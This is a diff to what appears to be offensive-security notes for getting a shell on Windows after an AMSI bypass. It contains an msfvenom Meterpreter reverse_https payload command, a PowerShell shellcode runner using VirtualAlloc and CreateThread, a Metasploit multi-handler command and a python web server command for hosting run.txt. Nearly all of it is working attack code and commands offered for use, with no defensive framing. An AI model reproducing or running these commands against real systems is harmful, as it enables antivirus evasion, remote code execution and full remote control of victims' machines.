@@ -3,7 +3,7 @@ Once AMSI has been bypassed, the following can be used to receive a shell
 Create PS1 msfvenom payload:
 
 ```bash
-sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=8081 -f ps1
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f ps1
 ```
 
 Update run.txt:
@@ -47,7 +47,7 @@ Param (
 
 $lpMem =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
 
-#Replace below with: sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=80 -f ps1
+#Replace below with: sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f ps1
 [Byte[]] $buf = <snip>
 
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
@@ -55,6 +55,18 @@ $lpMem =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+
+Configure Multi-Handler:
+
+```bash
+sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST x.x.x.x;set LPORT 443;run;"
+```
+
+Create web server to host run.txt
+
+```bash
+sudo python3 -m http.server 80
 ```
 
 Create payload:
